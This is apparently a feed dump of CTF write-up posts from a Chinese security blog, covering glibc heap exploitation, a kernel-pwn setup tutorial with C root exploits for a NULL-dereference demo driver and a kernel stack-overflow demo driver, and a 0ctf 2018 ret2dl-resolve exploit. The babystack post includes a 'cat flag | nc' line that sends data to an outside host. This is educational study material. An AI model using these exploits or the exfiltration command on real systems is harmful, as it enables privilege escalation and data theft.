class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">build(<span class="string">'/bin/sh\0'</span>,<span class="number">1</span>) <span class="comment">#0 1</span></span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span>),<span class="number">1</span>)<span class="comment"># 0 1 2</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x30</span>,<span class="number">1</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'system'</span>])*<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">destroy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;once&quot;&gt;&lt;a href=&quot;#once&quot; class=&quot;headerlink&quot; title=&quot;once&quot;&gt;&lt;/a&gt;once&lt;/h1&gt;&lt;p&gt;此题共有四个函数，自行实现了一个类似于unsorted bin的数据结构，其结构体如下：&lt;/p&gt;
&lt;figure class
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CTF KETNEL PWN 入门记录</title>
    <link href="http://p4nda.top/2018/04/04/kernel-pwn-start/"/>
    <id>http://p4nda.top/2018/04/04/kernel-pwn-start/</id>
    <published>2018-04-04T08:46:04.000Z</published>
    <updated>2018-04-04T11:21:49.457Z</updated>
    
    <content type="html"><![CDATA[<p>从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。</p><p>最开始参考的是安全客上的两篇文章，都来自<a href="https://o0xmuhe.github.io/" target="_blank" rel="noopener">o0xmuhe</a></p><p><a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">Linux 内核漏洞利用教程（一）：环境配置</a></p><p><a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">Linux 内核漏洞利用教程（二）：两个Demo</a></p><p>本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…）</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>文中提到的安装依赖库及qemu时，在make menuconfig就很懵…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure><p>突然出现一大堆选项，而且并不知道是干嘛的…</p><p><img src="/img/kernel_pwn_begin/0.png" alt=""></p><p>最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的<strong>Save an Alternate Configuration File</strong>，然后选择默认命名的.config就可以了。</p><p>其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。</p><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><p>在编译busybox时，需要去掉</p><p>1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统</p><p><img src="/img/kernel_pwn_begin/1.png" alt=""></p><p>2 Networking Utilities -&gt; [] inetd (Internet超级服务器)</p><p><img src="/img/kernel_pwn_begin/2.png" alt=""></p><h2 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h2><p>qemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功）</p><p>首先，在busy-box的根目录下建立_install文件夹，作为文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure><p>在_install中的etc文件中增加inittab文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> etc</span><br><span class="line">touch inittab</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure><p>增加etc/init.d/rcS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir init.d</span><br><span class="line"><span class="built_in">cd</span> init.d</span><br><span class="line">touch rcS</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -</span><br></pre></td></tr></table></figure><p>建立完上述文件后，可以制作img镜像了。</p><p>在_install文件夹下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>启动gdb的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex <span class="string">"add-auto-load-safe-path <span class="variable">$(pwd)</span>"</span> \</span><br><span class="line">    -ex <span class="string">"file vmlinux"</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64:intel'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span> \</span><br><span class="line">    -ex <span class="string">'break start_kernel'</span> \</span><br><span class="line">    -ex <span class="string">'continue'</span> \</span><br><span class="line">    -ex <span class="string">'disconnect'</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span></span><br></pre></td></tr></table></figure><p>启动qemu的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init"</span> --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0</span><br></pre></td></tr></table></figure><h1 id="两个Demo"><a href="#两个Demo" class="headerlink" title="两个Demo"></a>两个Demo</h1><h2 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h2><p>编译内核及利用的exp、poc时，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>。</p><p>另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile </p><p>每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。</p><h2 id="NULL-Dereference"><a href="#NULL-Dereference" class="headerlink" title="NULL Dereference"></a>NULL Dereference</h2><p>这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。</p><p>因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。</p><p>和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。</p><p>附64位的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------shellcode.s -----------------</span><br><span class="line">xor %rax,%rax</span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81081030</span></span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81080e40</span></span><br><span class="line">ret</span><br><span class="line">------------------------<span class="built_in">exp</span>.c ---------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">"muhe"</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h2><p>这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了…</p><p>在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> eip,user_cs,user_eflags,user_sp,user_ss;</span><br><span class="line"><span class="keyword">char</span> bin_sh[] = <span class="string">"/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *rsp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">0x50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> j = <span class="number">0x78</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//"pushq %%ss\n"</span></span><br><span class="line">        <span class="string">"subq %2,%%rsp\n"</span></span><br><span class="line">        <span class="string">"movq %%ss,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rsp\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="comment">//"pushq %%cs\n"</span></span><br><span class="line">        <span class="string">"movq %%cs,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span>        </span><br><span class="line">        <span class="string">"pushq %0\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp,%1\n"</span></span><br><span class="line">        <span class="string">"addq %3,%%rsp"</span></span><br><span class="line">        :<span class="string">"=m"</span>(eip),<span class="string">"=r"</span>(user_sp),<span class="string">"=m"</span>(i),<span class="string">"=m"</span>(j)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080db0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080bc0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %0,%%rsp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span></span><br><span class="line">        :<span class="string">"=m"</span>(user_sp)</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">40</span>);</span><br><span class="line">    eip =(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) get_shell;</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">32</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。&lt;/p&gt;
&lt;p&gt;最开始参考的是安全客上的两篇文章，都来自&lt;a href=&quot;https://o0xmuhe.github.io/&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
  </entry>
  
  <entry>
    <title>0ctf 2018 PWN 部分题解</title>
    <link href="http://p4nda.top/2018/04/04/0ctf2018/"/>
    <id>http://p4nda.top/2018/04/04/0ctf2018/</id>
    <published>2018-04-04T07:42:05.000Z</published>
    <updated>2018-04-04T08:26:46.208Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。</p><p><img src="/img/0CTF2018/0.png" alt=""></p><p>靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。</p><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。</p><p>这篇博客对这个知识点讲的很清楚 <a href="http://www.freebuf.com/articles/system/149214.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149214.html</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment">#flag&#123;return_to_dlresolve_for_warming_up&#125;</span></span><br><span class="line">ct = string.ascii_letters+string.digits</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(io)</span>:</span></span><br><span class="line"><span class="comment">#io.recvuntil("+")</span></span><br><span class="line">s = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#io.recvuntil("== ")</span></span><br><span class="line"><span class="comment">#dst = io.recvuntil("\n")[:-1]</span></span><br><span class="line"><span class="keyword">print</span> repr(s)</span><br><span class="line"><span class="comment">#print repr(dst)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpre</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c2 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c3 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c4 <span class="keyword">in</span> ct:</span><br><span class="line">pre = c1 + c2 + c3 + c4</span><br><span class="line"><span class="comment">#hasho = hashlib.sha256(s+pre)</span></span><br><span class="line"><span class="comment">#print hasho.hexdigest()</span></span><br><span class="line"><span class="keyword">if</span> hashlib.sha256(s + pre).digest().startswith(<span class="string">'\0\0\0'</span>):<span class="comment">#hasho.hexdigest().lower().startswith('\0\0\0'):</span></span><br><span class="line"><span class="keyword">return</span> pre</span><br><span class="line">pre = getpre()</span><br><span class="line"><span class="keyword">print</span> pre</span><br><span class="line">io.send(pre)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">'202.120.7.202'</span>, <span class="number">6666</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">login(p)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_start = <span class="number">0x804a000</span></span><br><span class="line">leave_ret = <span class="number">0x8048455</span></span><br><span class="line">pppr = <span class="number">0x080484e9</span></span><br><span class="line">relplt = <span class="number">0x80482b0</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x80484e9')</span></span><br><span class="line">part1 = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(bss_start+<span class="number">0x800</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_start+<span class="number">0x800</span>) + p32(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part1 '</span> ,len(part1)</span><br><span class="line"><span class="comment">#p.send(part1)</span></span><br><span class="line">rop1 = p32(bss_start+<span class="number">0x800</span>+<span class="number">0x200</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_start + <span class="number">0x100</span>)  +p32(<span class="number">44</span>)</span><br><span class="line">rop1 += p32(<span class="number">0x80482f0</span>) + p32(bss_start+<span class="number">0x100</span> - relplt) +p32(pppr)+ p32(<span class="number">0x804a124</span>)<span class="comment"># + p32(0) + p32(bss_start + 0x200)  +p32(0x100)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part2 '</span> ,len(rop1)</span><br><span class="line"><span class="comment">#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) </span></span><br><span class="line"><span class="comment">#p.send(rop1)</span></span><br><span class="line"></span><br><span class="line">rop2 = p32(<span class="number">0x0804a00c</span>)+p32(<span class="number">0x0001f407</span>)+ p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x1ef0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">12</span>) + <span class="string">'system\0\0'</span></span><br><span class="line">rop3 = rop2 + <span class="string">'/bin/sh\0'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part3 '</span> ,len(rop3)</span><br><span class="line"><span class="comment">#rop = rop3 + 'a'*(0x100-len(rop3))</span></span><br><span class="line">p.send(part1+rop1+rop3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x080484eb : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080482e9 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x080484ea : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 0x00000006 (SYMTAB)                     0x80481cc</span></span><br><span class="line"><span class="string"> 0x0000000b (SYMENT)                     16 (bytes)</span></span><br><span class="line"><span class="string"> 0x6ffffff0 (VERSYM)                     0x804827c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x /4wx 0x80481cc+16</span></span><br><span class="line"><span class="string">0x80481dc:0x0000001a0x000000000x000000000x00000012</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>拿到shell，发现此题没有输出…  解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了…</p><p>最后看到flag，果然这种方法就是预期解… </p><h1 id="babyheap"><a href="#babyheap" class="headerlink" 